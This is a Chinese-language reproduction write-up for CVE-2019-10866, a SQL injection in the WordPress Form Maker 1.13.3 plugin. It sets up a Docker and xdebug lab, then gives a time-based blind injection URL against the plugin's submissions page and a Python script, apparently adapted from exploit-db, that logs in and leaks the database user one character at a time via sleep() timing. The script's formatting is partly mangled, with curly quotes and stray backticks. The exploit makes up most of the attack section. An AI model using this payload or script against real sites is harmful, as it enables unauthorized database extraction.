---
title: "（CVE- 2019-10866）WordPress Plugin - Form Maker 1.13.3 sql注入"
id: zhfly3249
---

# （CVE- 2019-10866）WordPress Plugin - Form Maker 1.13.3 sql注入

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

### 环境搭建

运行环境很简单，只是在vulapps的基础环境的上加了xdebug调试插件，把docker容器作为远程服务器来进行调试。
Dockerfile文件:

```
FROM medicean/vulapps:base_lamp_php7

RUN pecl install xdebug `COPY php.ini /etc/php/7.0/apache2/

COPY php.ini /etc/php/7.0/cli/` 
```

docker-compose文件:

```
version: '3'
services:
  lamp-php7:
    build: .
    ports:
      - "80:80"
    volumes:
      - "/Users/mengchen/Security/Code Audit/html:/var/www/html"
      - "/Users/mengchen/Security/Code Audit/tmp:/tmp" 
```

php.ini中xdebug的配置

```
[xdebug]
zend_extension="/usr/lib/php/20151012/xdebug.so"
xdebug.remote_enable=1
xdebug.remote_host=10.254.254.254
xdebug.remote_port=9000
xdebug.remote_connect_back=0
xdebug.profiler_enable=0
xdebug.idekey=PHPSTORM
xdebug.remote_log="/tmp/xdebug.log" 
```

因为我是在Mac上，所以要给本机加一个IP地址，让xdebug能够连接

```
sudo ifconfig lo0 alias 10.254.254.254 
```

PHPStorm也要配置好相对路径:

![image](../img/59b80a4c5f9f72d5759f82d9c914c1f8.png)

插件下载地址:

```
https://downloads.wordpress.org/plugin/form-maker.1.13.3.zip 
```

WordPress使用最新版就可以，在这里我使用的版本是5.2.2，语言选的简体中文。

PS: WordPress搭建完毕后，记得关闭自动更新。

### POC

```
http://0-sec.org/wp-admin/admin.php?page=submissions_fm&task=display&current_id=2&order_by=group_id&asc_or_desc=,(case+when+(select+ascii(substring(user(),1,1)))%3d114+then+(select+sleep(5)+from+wp_users+limit+1)+else+2+end)+asc%3b 
```

Python脚本，修改自exploit-db

```
#coding:utf-8
import requests
import time

vul_url = “[http://127.0.0.1/wp-admin/admin.php?page=submissions_fm&task=display&current_id=2&order_by=group_id&asc_or_desc=](http://127.0.0.1/wp-admin/admin.php?page=submissions_fm&task=display&current_id=2&order_by=group_id&asc_or_desc=)”

S = requests.Session()

S.headers.update({“User-Agent”: “Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0”, “Accept”: “text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8”, “Accept-Language”: “zh-CN,en;q=0.8,zh;q=0.5,en-US;q=0.3”, “Referer”: “[http://127.0.0.1/wp-login.php?loggedout=true](http://127.0.0.1/wp-login.php?loggedout=true)”, “Content-Type”: “application/x-www-form-urlencoded”, “Connection”: “close”, “Upgrade-Insecure-Requests”: “1”})

length = 0

TIME = 3

username = “admin”

password = “admin”

def login(username, password):

data = {

“log”: “admin”,

“pwd”: “admin”,

“wp-submit”: “\xe7\x99\xbb\xe5\xbd\x95”,

“redirect_to”: “[http://127.0.0.1/wp-admin/](http://127.0.0.1/wp-admin/)”,

“testcookie”: “1”

}

r = S.post(‘[http://127.0.0.1/wp-login.php](http://127.0.0.1/wp-login.php)’, data=data, cookies = {“wordpress_test_cookie”: “WP+Cookie+check”}) `def attack():

flag = True

data = “”

length = 1

while flag:

flag = False

tmp_ascii = 0

for ascii in range(32, 127):

tmp_ascii = ascii

start_time = time.time()

payload = “{vul_url},(case+when+(select+ascii(substring(user(),{length},1)))%3d{ascii}+then+(select+sleep({TIME})+from+wp_users+limit+1)+else+2+end)+asc%3b”.format(vul_url=vul_url, ascii=ascii, TIME=TIME, length=length)

#print(payload)

r = S.get(payload)

tmp = time.time() - start_time

if tmp >= TIME:

flag = True

break

if flag:

data += chr(tmp_ascii)

length += 1

print(data)

login(username, password)

attack()` 
```

![image](../img/372d323b498e85ad75fb338c30feaf99.png)